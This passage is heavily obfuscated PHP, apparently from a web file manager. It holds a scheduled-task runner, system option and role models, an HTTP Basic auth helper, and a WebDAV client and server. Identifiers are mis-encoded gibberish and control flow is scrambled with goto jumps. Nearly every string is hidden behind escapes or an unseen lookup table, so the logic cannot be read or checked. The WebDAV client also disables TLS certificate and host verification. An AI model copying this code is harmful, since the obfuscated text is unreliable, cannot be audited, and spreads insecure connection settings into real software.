$_SERVER[Õİõş]; self::valueSet($e–ê—¯Š‚›[1381], $e–ê—¯Š‚›[463]); self::log($e–ê—¯Š‚›[1387]); } public static function config($eÒÔÈÕ¡áö, $e³ŒËÏªº) { $béœƒİØ¤Í =& $_SERVER[Õİõş]; $B¥êìÇƒ»… = 20; $e³ŒËÏªº = intval($e³ŒËÏªº) <= $B¥êìÇƒ»… ? $B¥êìÇƒ»… : intval($e³ŒËÏªº); self::valueSet($béœƒİØ¤Í[691], $eÒÔÈÕ¡áö); self::valueSet($béœƒİØ¤Í[1386], $e³ŒËÏªº); } private static function taskRunAll() { $F³â¨Ÿ†Êö =& $_SERVER[Õİõş]; $Aìî¦³ ÁÕ = Model($F³â¨Ÿ†Êö[1388])->listData(); $Dƒ›­ØÃÓ¸ = count($Aìî¦³ ÁÕ); for ($DØ©Ãò‘É = 0; $DØ©Ãò‘É < $Dƒ›­ØÃÓ¸; $DØ©Ãò‘É++) { $fãøç¿‰¯ = $Aìî¦³ ÁÕ[$DØ©Ãò‘É]; if ($fãøç¿‰¯[$F³â¨Ÿ†Êö[1389]] != $F³â¨Ÿ†Êö[83]) { continue; } if (!self::taskTimeCheck($fãøç¿‰¯)) { continue; } self::taskRun($fãøç¿‰¯); } Hook::trigger($F³â¨Ÿ†Êö[1390]); } private static function taskTimeCheck($b–ƒ«¯çË) { goto cÊ•ñÎÅ…¢; D›Ë®ÚÄ—½: switch ($d¼¿×®…‘‚[$Cæ×ÅÅ®ê[29]]) { case $Cæ×ÅÅ®ê[1397]: if (time() - $BÂÌ“ÌÛŞ < 3600 * 24 * 30) { return !1; } if ($d¼¿×®…‘‚[$Cæ×ÅÅ®ê[1397]] == date($Cæ×ÅÅ®ê[1398]) && $D²Ş¶¢´Ò) { return !0; } break; case $Cæ×ÅÅ®ê[1399]: if (time() - $BÂÌ“ÌÛŞ < 3600 * 24 * 7) { return !1; } $B²‡Ì¤á‘… = date($Cæ×ÅÅ®ê[1400]) == 0 ? 7 : date($Cæ×ÅÅ®ê[1400]); if ($d¼¿×®…‘‚[$Cæ×ÅÅ®ê[1399]] == $B²‡Ì¤á‘… && $D²Ş¶¢´Ò) { return !0; } break; case $Cæ×ÅÅ®ê[1392]: if (time() - $BÂÌ“ÌÛŞ < 3600 * 24) { return !1; } if ($D²Ş¶¢´Ò) { return !0; } break; case $Cæ×ÅÅ®ê[1401]: if (time() - $BÂÌ“ÌÛŞ >= floatval($d¼¿×®…‘‚[$Cæ×ÅÅ®ê[1401]]) * 60) { return !0; } break; default: break; } return !1; goto Eï’È¨«Íù; cÊ•ñÎÅ…¢: $Cæ×ÅÅ®ê =& $_SERVER[Õİõş]; $d¼¿×®…‘‚ = json_decode($b–ƒ«¯çË[$Cæ×ÅÅ®ê[186]], !0); $BÂÌ“ÌÛŞ = intval($b–ƒ«¯çË[$Cæ×ÅÅ®ê[1382]]); goto Däßî‹ù…§; Däßî‹ù…§: $a·é’·ï©ò = strtotime($Cæ×ÅÅ®ê[1391] . $d¼¿×®…‘‚[$Cæ×ÅÅ®ê[1392]] . $Cæ×ÅÅ®ê[1393]) - strtotime($Cæ×ÅÅ®ê[1394]); $d­“ˆƒçìß = time() - strtotime(date($Cæ×ÅÅ®ê[1395]) . $Cæ×ÅÅ®ê[1396]); $D²Ş¶¢´Ò = $d­“ˆƒçìß >= $a·é’·ï©ò && $d­“ˆƒçìß <= $a·é’·ï©ò + 3600; goto D›Ë®ÚÄ—½; Eï’È¨«Íù: } public static function taskRun($Aƒ¥øÒççõ) { goto D´Ú¹ÔŠÊì; F’ê•ß¶Ê¯: Model($a‚ª—œËáÚ[1406])->add(array($a‚ª—œËáÚ[1407] => $a‚ª—œËáÚ[33], $a‚ª—œËáÚ[1408] => $a‚ª—œËáÚ[463], $a‚ª—œËáÚ[29] => $a‚ª—œËáÚ[1409] . $Aƒ¥øÒççõ[$a‚ª—œËáÚ[363]], $a‚ª—œËáÚ[1410] => json_encode(array($a‚ª—œËáÚ[28] => $Aƒ¥øÒççõ[$a‚ª—œËáÚ[28]], $a‚ª—œËáÚ[1411] => timeFloat() - $FÉ²§Â‘è, $a‚ª—œËáÚ[277] => $f‚é©ÊÆê‰)))); self::log($a‚ª—œËáÚ[1412] . $Aƒ¥øÒççõ[$a‚ª—œËáÚ[363]] . $a‚ª—œËáÚ[1413] . $f‚é©ÊÆê‰); return !0; goto Fø‡åìØÄ¤; c©ëÁ’Ù‚Õ: $FÉ²§Â‘è = timeFloat(); $f‚é©ÊÆê‰ = $a‚ª—œËáÚ[33]; switch ($Aƒ¥øÒççõ[$a‚ª—œËáÚ[29]]) { case $a‚ª—œËáÚ[291]: $F¼ÛÍ†Ë£÷ = url_request($Aƒ¥øÒççõ[$a‚ª—œËáÚ[1405]], $a‚ª—œËáÚ[212], !1, !1, !1, !1, 5); $f‚é©ÊÆê‰ = strlen($F¼ÛÍ†Ë£÷); break; case $a‚ª—œËáÚ[211]: $f‚é©ÊÆê‰ = Hook::apply($Aƒ¥øÒççõ[$a‚ª—œËáÚ[1405]]); default: break; } goto F’ê•ß¶Ê¯; D´Ú¹ÔŠÊì: $a‚ª—œËáÚ =& $_SERVER[Õİõş]; self::log($a‚ª—œËáÚ[1402] . $Aƒ¥øÒççõ[$a‚ª—œËáÚ[363]] . $a‚ª—œËáÚ[1403] . $Aƒ¥øÒççõ[$a‚ª—œËáÚ[28]] . $a‚ª—œËáÚ[1404] . $Aƒ¥øÒççõ[$a‚ª—œËáÚ[1405]]); Model($a‚ª—œËáÚ[1388])->run($Aƒ¥øÒççõ[$a‚ª—œËáÚ[363]]); goto c©ëÁ’Ù‚Õ; Fø‡åìØÄ¤: } private static function valueGet($f¶Ê¸ß±ÉŠ) { $b‡’¹ÓÄå =& $_SERVER[Õİõş]; $D–ÀŠµ•ïÃ = $b‡’¹ÓÄå[1414]; $f›ĞÒòÀì = Model($b‡’¹ÓÄå[1415])->get($f¶Ê¸ß±ÉŠ, $D–ÀŠµ•ïÃ); if (is_null($f›ĞÒòÀì)) { Model($b‡’¹ÓÄå[1415])->set($b‡’¹ÓÄå[1386], 10, $D–ÀŠµ•ïÃ); Model($b‡’¹ÓÄå[1415])->set($b‡’¹ÓÄå[691], $b‡’¹ÓÄå[83], $D–ÀŠµ•ïÃ); Model($b‡’¹ÓÄå[1415])->set($b‡’¹ÓÄå[1381], $b‡’¹ÓÄå[463], $D–ÀŠµ•ïÃ); $f›ĞÒòÀì = Model($b‡’¹ÓÄå[1415])->get($f¶Ê¸ß±ÉŠ, $D–ÀŠµ•ïÃ); } return $f›ĞÒòÀì; } private static function valueSet($B§ˆµåƒ, $B½Æ¦ïË¶) { $fèÚ¦´œ†¡ =& $_SERVER[Õİõş]; return Model($fèÚ¦´œ†¡[1415])->set($B§ˆµåƒ, $B½Æ¦ïË¶, $fèÚ¦´œ†¡[1414]); } protected static function log($dê¨ÈÉ•Í†) { write_log($dê¨ÈÉ•Í†, $_SERVER[Õİõş][1416]); } private static function cacheClear() { $bíãŒšÃÛà =& $_SERVER[Õİõş]; $BòÌÓ£ø¢ = Model($bíãŒšÃÛà[1415])->cacheKey($bíãŒšÃÛà[1414]); Cache::clearMemory($BòÌÓ£ø¢); } } goto Bâ¨Óç·Åê; c‡ˆÛŒáº: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\x65\x6d\137\157\160\x74\x69\157\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\157\x6c\x65", "\x72\157\154\145\x47\162\157\x75\x70", "\x72\x65\x67\x69\163\164", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($C«¹Ö‘¥¢) { return "\x53\x79\163\164\145\155\117\x70\x74\x69\x6f\x6e\x5f{$C«¹Ö‘¥¢}"; } protected function optionDefault($dÚ²µÒæ‚§ = '') { $FËî’ŠÃ¥Ô =& $_SERVER[Õİõş]; if ($dÚ²µÒæ‚§ == $FËî’ŠÃ¥Ô[33]) { return $GLOBALS[$FËî’ŠÃ¥Ô[6]][$FËî’ŠÃ¥Ô[2448]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\162\x6f\x6c\x65\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\150", "\154\141\x62\145\x6c", "\144\x69\x73\160\x6c\x61\171", "\x73\171\x73\x74\145\155", "\x64\145\163\x63", "\x69\x67\x6e\157\162\145\x45\x78\164", "\151\x67\x6e\x6f\x72\x65\106\151\154\x65\123\151\x7a\x65", "\x61\144\155\x69\156\x69\x73\x74\x72\x61\164\x6f\x72", "\x73\x6f\162\164"); public function listData($eÈÎ¹®…¢„ = false, $Bî¿˜Âä•° = "\163\157\x72\164", $b™ï’ª˜ ¦ = false) { return parent::listData($eÈÎ¹®…¢„, $Bî¿˜Âä•°, $b™ï’ª˜ ¦); } public function update($bºŠÃè‚©‚, $A„®Êî—èÜ) { goto C£¸¼¢ŒÍğ; C›‘£×Ü˜‹: if (!$D—†ö©‚¿ || $FÓÄ¦Šùã† && $FÓÄ¦Šùã†[$fù’¯ÇÔæ±[363]] != $D—†ö©‚¿[$fù’¯ÇÔæ±[363]]) { return !1; } if ($FÓÄ¦Šùã†[$fù’¯ÇÔæ±[2449]] == 1) { $A„®Êî—èÜ = array($fù’¯ÇÔæ±[28] => $A„®Êî—èÜ[$fù’¯ÇÔæ±[28]], $fù’¯ÇÔæ±[2098] => $A„®Êî—èÜ[$fù’¯ÇÔæ±[2098]]); } $this->filterAuth($A„®Êî—èÜ[$fù’¯ÇÔæ±[372]]); goto F»œƒÄ‰à; C£¸¼¢ŒÍğ: $fù’¯ÇÔæ± =& $_SERVER[Õİõş]; $D—†ö©‚¿ = parent::listData($bºŠÃè‚©‚); $FÓÄ¦Šùã† = $this->findByName($A„®Êî—èÜ[$fù’¯ÇÔæ±[28]]); goto C›‘£×Ü˜‹; F»œƒÄ‰à: return parent::update($bºŠÃè‚©‚, $A„®Êî—èÜ); goto D¡°‡öÏæ¿; D¡°‡öÏæ¿: } public function remove($a¶„ÀÎÜ«¦) { $FÑ¿„ˆÄ‹ = parent::listData($a¶„ÀÎÜ«¦); if (!$FÑ¿„ˆÄ‹ || $FÑ¿„ˆÄ‹[$_SERVER[Õİõş][1083]]) { return !1; } return parent::remove($a¶„ÀÎÜ«¦); } public function add($f›ˆ…Ú±œÉ) { goto fÙóë®Ïæ; CÒ£Ìí†ã: return parent::insert($f›ˆ…Ú±œÉ); goto bÆÈ‘àê¦‹; cš´Š…ˆ÷‘: $eÂˆùŒ¹Òª = array($FÓå³‹•ªœ[382] => $FË†İ‡½Ÿ, $FÓå³‹•ªœ[2086] => $FÓå³‹•ªœ[33], $FÓå³‹•ªœ[2082] => $FÓå³‹•ªœ[2099], $FÓå³‹•ªœ[2450] => 1, $FÓå³‹•ªœ[2085] => 0, $FÓå³‹•ªœ[2451] => 0, $FÓå³‹•ªœ[2084] => $this->getSort()); $f›ˆ…Ú±œÉ = array_merge($eÂˆùŒ¹Òª, $f›ˆ…Ú±œÉ); $this->filterAuth($f›ˆ…Ú±œÉ[$FÓå³‹•ªœ[372]]); goto CÒ£Ìí†ã; fÙóë®Ïæ: $FÓå³‹•ªœ =& $_SERVER[Õİõş]; $FË†İ‡½Ÿ = $f›ˆ…Ú±œÉ[$FÓå³‹•ªœ[28]]; if ($this->findByName($FË†İ‡½Ÿ)) { return !1; } goto cš´Š…ˆ÷‘; bÆÈ‘àê¦‹: } private function getSort() { $CØî·ùç¹æ =& $_SERVER[Õİõş]; $Fˆ¶Æ–¥£è = parent::listData(); $e¾™¾´Ğ›Ö = array_to_keyvalue($Fˆ¶Æ–¥£è, $CØî·ùç¹æ[33], $CØî·ùç¹æ[2101]); return empty($e¾™¾´Ğ›Ö) ? 0 : max($e¾™¾´Ğ›Ö) + 1; } private function filterAuth(&$C¥Ì–¶Ó¢) { $a¹¸÷è¯ò =& $_SERVER[Õİõş]; $aº”²‹ìÕÍ = array(); $FÒÁ¼”ŠÌ• = array_filter(explode($a¹¸÷è¯ò[47], $C¥Ì–¶Ó¢)); foreach ($FÒÁ¼”ŠÌ• as $C¥Ì–¶Ó¢) { $cĞ˜™ÈŠÅ = explode($a¹¸÷è¯ò[91], $C¥Ì–¶Ó¢); if ($cĞ˜™ÈŠÅ[0] == $a¹¸÷è¯ò[1760] && $cĞ˜™ÈŠÅ[1] != $a¹¸÷è¯ò[1039]) { $E·¯ËŠö = $cĞ˜™ÈŠÅ[0] . $a¹¸÷è¯ò[91] . $cĞ˜™ÈŠÅ[1] . $a¹¸÷è¯ò[2452]; if (!in_array($E·¯ËŠö, $FÒÁ¼”ŠÌ•)) { $aº”²‹ìÕÍ[] = $E·¯ËŠö; } } $aº”²‹ìÕÍ[] = $C¥Ì–¶Ó¢; } $C¥Ì–¶Ó¢ = implode($a¹¸÷è¯ò[47], $aº”²‹ìÕÍ); } public function sort($a—×©„ù±, $d˜ñáÖ‰èˆ) { return parent::update($a—×©„ù±, $d˜ñáÖ‰èˆ); } } goto bÕäŸ¼æÉ»; Bˆƒƒ†Óº: class HttpAuth { public static function get() { $AÃõò¦ùåÓ =& $_SERVER[Õİõş]; $a’¾ƒ¥…â— = $AÃõò¦ùåÓ[33]; $B´ğ¿ÊÑÃ = $AÃõò¦ùåÓ[33]; if (isset($_SERVER[$AÃõò¦ùåÓ[1736]])) { $a’¾ƒ¥…â— = $_SERVER[$AÃõò¦ùåÓ[1736]]; $B´ğ¿ÊÑÃ = $_SERVER[$AÃõò¦ùåÓ[1737]]; } elseif (isset($_SERVER[$AÃõò¦ùåÓ[1738]])) { $cŠÁôó¥—õ = $_SERVER[$AÃõò¦ùåÓ[1738]]; if (strpos(strtolower($cŠÁôó¥—õ), $AÃõò¦ùåÓ[1739]) === 0) { $DñÇ—Òîã = explode($AÃõò¦ùåÓ[4], base64_decode(substr($cŠÁôó¥—õ, 6))); $a’¾ƒ¥…â— = isset($DñÇ—Òîã[0]) ? $DñÇ—Òîã[0] : $AÃõò¦ùåÓ[33]; $B´ğ¿ÊÑÃ = isset($DñÇ—Òîã[1]) ? $DñÇ—Òîã[1] : 0; } } return array($AÃõò¦ùåÓ[530] => $a’¾ƒ¥…â—, $AÃõò¦ùåÓ[901] => $B´ğ¿ÊÑÃ); } public static function error() { goto aÏö» •Ì; D¶²ğ»À…å: header($EÙï¾‚ñİ[1742]); header($EÙï¾‚ñİ[1743]); header($EÙï¾‚ñİ[1258]); goto eø®Ğİà; eø®Ğİà: die; goto bè„¾ˆÙİ´; aÏö» •Ì: $EÙï¾‚ñİ =& $_SERVER[Õİõş]; header($EÙï¾‚ñİ[1740]); header($EÙï¾‚ñİ[1741]); goto D¶²ğ»À…å; bè„¾ˆÙİ´: } public static function make($f¬…®Ğ×Ï», $C‰Š§Û¼ÎÅ) { $c…†óÙç‚ =& $_SERVER[Õİõş]; return $c…†óÙç‚[1744] + base64_encode($f¬…®Ğ×Ï» . $c…†óÙç‚[4] . $C‰Š§Û¼ÎÅ); } } class HttpDavClient { public function __construct($E‘Ğ«—º¡´, $A»’å†¢ÑÇ, $cÀ½ò–åÃá) { $this->header = array(); $this->userName = $A»’å†¢ÑÇ; $this->userPassowrd = $cÀ½ò–åÃá; } protected function makePath($CÌíå‡ß¡“) { return $CÌíå‡ß¡“; } protected function setHeader($fäÀõ“Û¦’, $Dõ™ÍÁ‡Ì = false) { if ($Dõ™ÍÁ‡Ì === !1) { $this->header[] = $fäÀõ“Û¦’; } else { $this->header[] = $fäÀõ“Û¦’ . $_SERVER[Õİõş][884] . $Dõ™ÍÁ‡Ì; } } public function move($cæÓ„„˜­ß, $F©‰‹áŠùØ, $d ó³¡œ« = '') { $BÖ’’ò Â„ =& $_SERVER[Õİõş]; $this->setHeader($BÖ’’ò Â„[1745], $this->makePath($F©‰‹áŠùØ)); $this->setHeader($BÖ’’ò Â„[1746], $BÖ’’ò Â„[1747]); if ($d ó³¡œ«) { $this->setHeader($BÖ’’ò Â„[1748], $BÖ’’ò Â„[929] . $d ó³¡œ« . $BÖ’’ò Â„[932]); } return $this->send($BÖ’’ò Â„[1749], $cæÓ„„˜­ß); } public function copy($E•÷ç¿˜÷Ó, $càÈ£°ïô) { $A‡Æ£Âšº =& $_SERVER[Õİõş]; $this->setHeader($A‡Æ£Âšº[1745], $this->makePath($càÈ£°ïô)); $this->setHeader($A‡Æ£Âšº[1746], $A‡Æ£Âšº[1747]); return $this->send($A‡Æ£Âšº[1750], $E•÷ç¿˜÷Ó); } public function mkcol($dÚ‘çëóÓ©) { $aÔİÂ„šŠ¨ =& $_SERVER[Õİõş]; $this->setHeader($aÔİÂ„šŠ¨[1746], $aÔİÂ„šŠ¨[1747]); return $this->send($aÔİÂ„šŠ¨[1751], $dÚ‘çëóÓ©); } public function delete($bíÄ°ÁèõÃ, $Fîè•¤¯ = '') { $C‰„‚ÒğŒ =& $_SERVER[Õİõş]; if ($Fîè•¤¯) { $this->setHeader($C‰„‚ÒğŒ[1748], $C‰„‚ÒğŒ[929] . $Fîè•¤¯ . $C‰„‚ÒğŒ[932]); } return $this->send($C‰„‚ÒğŒ[1246], $bíÄ°ÁèõÃ); } public function propfind($bª¸¬ª…Ù¢) { $aÔ†É¿Ä©ª =& $_SERVER[Õİõş]; $this->setHeader($aÔ†É¿Ä©ª[1752], $aÔ†É¿Ä©ª[83]); $this->setHeader($aÔ†É¿Ä©ª[1753], $aÔ†É¿Ä©ª[1754]); $b³­®†ä = $aÔ†É¿Ä©ª[1755]; return $this->send($aÔ†É¿Ä©ª[1756], $bª¸¬ª…Ù¢, $b³­®†ä); } public function options($b¶™‰çá…ä) { return $this->send($_SERVER[Õİõş][1757], $b¶™‰çá…ä); } public function get($F¦‰ÌÚï) { return $this->send($_SERVER[Õİõş][212], $F¦‰ÌÚï); } public function put($Cä²œÜ”Ó¸, $Bğ‡ôø®É, $BˆÅÀå©´œ = '') { $c§é•æÖ¾– =& $_SERVER[Õİõş]; if ($BˆÅÀå©´œ) { $this->setHeader($c§é•æÖ¾–[1748], $c§é•æÖ¾–[929] . $BˆÅÀå©´œ . $c§é•æÖ¾–[932]); } return $this->send($c§é•æÖ¾–[210], $Cä²œÜ”Ó¸, $Bğ‡ôø®É); } protected function send($cÌ‚÷“©„Ğ, $c–ƒ“£›ïæ, $fåğäšù‘İ = false, $Bèß®Ê‹Øô = false) { goto Fªï«‰ÉÜ; DßùŠğ¼ò: $this->header = array(); return $d‚£Ÿ‡ÒÅÎ; goto cîõ‘Œö«š; Fªï«‰ÉÜ: $cÂ‹²„«¶” =& $_SERVER[Õİõş]; $AÃÍñ­­ŒŒ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($cÂ‹²„«¶”[1758], $cÂ‹²„«¶”[50]); goto f±×„Áô×; f±×„Áô×: $this->setHeader($AÃÍñ­­ŒŒ); if ($fåğäšù‘İ) { $fåğäšù‘İ = $cÂ‹²„«¶”[1759] . $fåğäšù‘İ; } if (!request_url_safe($c–ƒ“£›ïæ)) { return !1; } goto eª¯—; b¹å­³šàâ: curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_HTTPHEADER, $this->header); curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_RETURNTRANSFER, !0); curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto dÂ©ƒ¸¤Â; eª¯—: $e¢Ô¼ƒé²Ó = curl_init($c–ƒ“£›ïæ); curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_CUSTOMREQUEST, $cÌ‚÷“©„Ğ); curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto b¹å­³šàâ; dÂ©ƒ¸¤Â: curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($e¢Ô¼ƒé²Ó, CURLOPT_SSL_VERIFYHOST, !1); $d‚£Ÿ‡ÒÅÎ = curl_exec($e¢Ô¼ƒé²Ó); goto DßùŠğ¼ò; cîõ‘Œö«š: } } class HttpDavServer { public function __construct($bè½¦ïë•ö, $EİÁÀé±´µ) { $this->root = $bè½¦ïë•ö; $this->initPath($EİÁÀé±´µ); $this->start(); } public function initPath($E¼åİÃÃÜ›) { $F•«ÇäĞñ =& $_SERVER[Õİõş]; $C»ˆÒ†¾±µ = rtrim($_SERVER[$F•«ÇäĞñ[1368]], $F•«ÇäĞñ[8]) . $F•«ÇäĞñ[8]; $this->urlBase = substr($C»ˆÒ†¾±µ, 0, strpos($C»ˆÒ†¾±µ, $E¼åİÃÃÜ›) + 1); $this->urlBase = rtrim($this->urlBase, $F•«ÇäĞñ[8]) . $E¼åİÃÃÜ›; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $F‡ªåÑ´ª÷ =& $_SERVER[Õİõş]; $f‚Ü ğá§ = HttpAuth::get(); if ($f‚Ü ğá§[$F‡ªåÑ´ª÷[530]] == $F‡ªåÑ´ª÷[1760] && $f‚Ü ğá§[$F‡ªåÑ´ª÷[901]] == $F‡ªåÑ´ª÷[1761]) { return !0; } HttpAuth::error(); } public function start() { goto DØ³¨ƒêì§; f­ù°Œì×: if (!$AóªÄ¶õ±ó) { return; } self::response($AóªÄ¶õ±ó); goto f…ï¬ÇÂè; DØ³¨ƒêì§: $fÜËğ“š• =& $_SERVER[Õİõş]; $this->checkUser(); $b‹»ˆĞ°Ò† = $fÜËğ“š•[142] . HttpHeader::method(); goto d‹Æ–éÅ÷; d‹Æ–éÅ÷: if (!method_exists($this, $b‹»ˆĞ°Ò†)) { pr($b‹»ˆĞ°Ò† . $fÜËğ“š•[1762]); die; } $bÂÜïŞÉß¡ = array($fÜËğ“š•[1763], $fÜËğ“š•[1764]); if (!in_array($b‹»ˆĞ°Ò†, $bÂÜïŞÉß¡) && !$this->pathExists($this->path)) { $AóªÄ¶õ±ó = array($fÜËğ“š•[1035] => 404); } else { $AóªÄ¶õ±ó = $this->{$b‹»ˆĞ°Ò†}(); } goto f­ù°Œì×; f…ï¬ÇÂè: } public function pathGet($BÛ™‚‚Áéø = false) { $E¯á·…Í° =& $_SERVER[Õİõş]; $BµÕçÊÚÛ‚ = $BÛ™‚‚Áéø ? $_SERVER[$E¯á·…Í°[1765]] : $_SERVER[$E¯á·…Í°[1368]]; $BµÕçÊÚÛ‚ = KodIO::clear(rawurldecode($BµÕçÊÚÛ‚)); if (!strstr($BµÕçÊÚÛ‚, KodIO::clear($this->urlBase))) { return !1; } return substr($BµÕçÊÚÛ‚, strpos($BµÕçÊÚÛ‚, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($D°“›†®®) { return file_exists($D°“›†®®); } public function pathMkdir($AÉ½Ò£¨óˆ) { return mkdir($AÉ½Ò£¨óˆ, 511, !0); } public function pathInfo($D÷àê™©Ô¾) { return path_info($D÷àê™©Ô¾); } public function pathList($BÆ‰ÈÉÁ™«) { return path_list($BÆ‰ÈÉÁ™«); } public function pathOut($e¢‘Šï©ãÀ) { echo file_get_contents($e¢‘Šï©ãÀ); } public function pathPut($bİøë»Ëá, $BÖõÑÅä‹± = '') { if (!$BÖõÑÅä‹±) { return file_put_contents($bİøë»Ëá, $_SERVER[Õİõş][33]); } return move_path($BÖõÑÅä‹±, $bİøë»Ëá); } public function pathRemove($bÏƒ…ÏÛëÍ) { if (is_file($bÏƒ…ÏÛëÍ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($D¶ŸÀ­µœØ, $DŞÇ¥ÈÇ—) { return move_path($D¶ŸÀ­µœØ, $DŞÇ¥ÈÇ—); } public function pathCopy($cæäô¦ƒâõ, $bø„ ¨ˆ¶¢) { return copy_dir($cæäô¦ƒâõ, $bø„ ¨ˆ¶¢); } public function parsePath($bì®ÃÊÈùÎ) { return $bì®ÃÊÈùÎ; } public function parseItem($DòĞƒÄå‡Æ, $C–ÛğÙÜà¸) { goto E¶‘Âã”À; E¶‘Âã”À: $Aó·½­ãø =& $_SERVER[Õİõş]; $aô¬Í…Š½è = $this->pathGet() . $Aó·½­ãø[8] . $DòĞƒÄå‡Æ[$Aó·½­ãø[28]]; $aô¬Í…Š½è = $Aó·½­ãø[8] . str_replace($Aó·½­ãø[168], $Aó·½­ãø[8], rawurlencode($aô¬Í…Š½è)); goto f­¿ô™ÊÎÔ; CŠÇ³ÄŒÚö: $Fè¾ŒäË’ = array($Aó·½­ãø[1766] => KodIO::clear($this->urlBase . $aô¬Í…Š½è), $Aó·½­ãø[106] => @gmdate($Aó·½­ãø[1767], $DòĞƒÄå‡Æ[$Aó·½­ãø[106]]), $Aó·½­ãø[183] => @gmdate($Aó·½­ãø[1768], $DòĞƒÄå‡Æ[$Aó·½­ãø[183]]), $Aó·½­ãø[77] => $DòĞƒÄå‡Æ[$Aó·½­ãø[77]] ? $DòĞƒÄå‡Æ[$Aó·½­ãø[77]] : 0); return $Fè¾ŒäË’; goto b½éì‰´Î; f­¿ô™ÊÎÔ: if ($C–ÛğÙÜà¸) { $aô¬Í…Š½è = $Aó·½­ãø[8] . str_replace($Aó·½­ãø[168], $Aó·½­ãø[8], rawurlencode($this->pathGet())); } if (!trim($DòĞƒÄå‡Æ[$Aó·½­ãø[106]])) { $DòĞƒÄå‡Æ[$Aó·½­ãø[106]] = time(); } if (!trim($DòĞƒÄå‡Æ[$Aó·½­ãø[183]])) { $DòĞƒÄå‡Æ[$Aó·½­ãø[183]] = time(); } goto CŠÇ³ÄŒÚö; b½éì‰´Î: } public function parseItemXml($BÛ…ŒíÃÒÍ, $A¨÷øßŞôÙ) { $Càß‚öÄ§À =& $_SERVER[Õİõş]; $dé§¯®Ô§ = $this->parseItem($BÛ…ŒíÃÒÍ, $A¨÷øßŞôÙ); if ($BÛ…ŒíÃÒÍ[$Càß‚öÄ§À[29]] == $Càß‚öÄ§À[76]) { $c‡¬‰Óäó = $Càß‚öÄ§À[1769]; $c‡¬‰Óäó .= $Càß‚öÄ§À[1770]; } else { $A»Û‹ñšÚ = $BÛ…ŒíÃÒÍ[$Càß‚öÄ§À[156]] ? $BÛ…ŒíÃÒÍ[$Càß‚öÄ§À[156]] : get_path_ext($BÛ…ŒíÃÒÍ[$Càß‚öÄ§À[28]]); $fäïÍïÒÑˆ = get_file_mime($A»Û‹ñšÚ); $c‡¬‰Óäó = $Càß‚öÄ§À[1771]; $c‡¬‰Óäó .= "\74\x44\x3a\147\x65\164\143\x6f\x6e\164\145\x6e\x74\x74\x79\x70\x65\x3e{$fäïÍïÒÑˆ}\74\x2f\104\72\147\x65\164\143\x6f\x6e\x74\x65\x6e\x74\164\171\160\x65\76"; } return "\12\x9\11\x3c\x44\72\162\x65\x73\160\157\156\163\x65\x3e\xa\11\11\x9\74\104\72\150\x72\145\x66\x3e{$dé§¯®Ô§[$Càß‚öÄ§À[1766]]}\74\57\104\x3a\150\x72\145\146\76\xa\11\x9\x9\x3c\x44\72\x70\x72\x6f\160\163\x74\141\164\76\xa\11\x9\x9\x9\74\x44\72\x70\x72\x6f\160\x3e\12\x9\11\x9\x9\x9\74\104\72\147\x65\164\154\x61\x73\164\155\157\144\151\146\151\x65\144\x3e{$dé§¯®Ô§[$Càß‚öÄ§À[106]]}\74\57\x44\72\147\x65\164\154\141\x73\164\155\x6f\x64\151\146\151\x65\x64\76\xa\11\11\11\11\x9\x3c\x44\72\x63\x72\145\141\164\151\x6f\x6e\144\141\x74\145\76{$dé§¯®Ô§[$Càß‚öÄ§À[183]]}\74\x2f\104\x3a\x63\162\145\x61\164\151\157\x6e\x64\141\164\x65\x3e\xa\x9\x9\11\x9\11\74\x44\x3a\147\x65\x74\x63\x6f\156\x74\145\156\x74\154\145\156\x67\x74\150\76{$dé§¯®Ô§[$Càß‚öÄ§À[77]]}\74\x2f\x44\72\147\145\164\x63\157\x6e\164\145\156\x74\154\x65\x6e\x67\164\150\x3e\xa\11\x9\x9\x9\x9{$c‡¬‰Óäó}\12\11\11\x9\x9\x3c\57\104\72\160\162\x6f\x70\76\xa\11\x9\x9\x9\74\104\x3a\163\164\141\164\165\x73\x3e\x48\124\124\120\57\61\x2e\x31\40\62\x30\60\x20\117\113\74\57\x44\x3a\x73\x74\141\x74\x75\163\76\xa\11\11\x9\x3c\x2f\104\x3a\x70\x72\157\160\x73\x74\x61\x74\76\12\11\11\x3c\57\104\72\x72\145\163\160\x6f\156\x73\x65\76"; } public function pathListMerge($bµ†­Í‰ì£) { goto b³ÛŞÅˆ¥ğ; A¬†»¢¢Çê: return $A•ì÷Õ Ô; goto cÑ–Õî²ìÕ; b³ÛŞÅˆ¥ğ: $CåÔ’î¨Û =& $_SERVER[Õİõş]; if (!$bµ†­Í‰ì£) { return $bµ†­Í‰ì£; } $bµõŞ¨›îµ = array($CåÔ’î¨Û[73], $CåÔ’î¨Û[74], $CåÔ’î¨Û[1772]); goto f¥İ‹Ôƒ‹â; f¥İ‹Ôƒ‹â: $A•ì÷Õ Ô = array(); foreach ($bµ†­Í‰ì£ as $e¯Ã·Î…‰· => $B¨¤‡Òæ£) { if (!in_array($e¯Ã·Î…‰·, $bµõŞ¨›îµ) || !is_array($B¨¤‡Òæ£)) { continue; } $A•ì÷Õ Ô = array_merge($A•ì÷Õ Ô, $B¨¤‡Òæ£); } foreach ($A•ì÷Õ Ô as &$aÕÀ‘ŠÉ³) { $aÕÀ‘ŠÉ³[$CåÔ’î¨Û[28]] = str_replace($CåÔ’î¨Û[8], $CåÔ’î¨Û[1370], $aÕÀ‘ŠÉ³[$CåÔ’î¨Û[28]]); } goto A¬†»¢¢Çê; cÑ–Õî²ìÕ: } public function httpPROPFIND() { 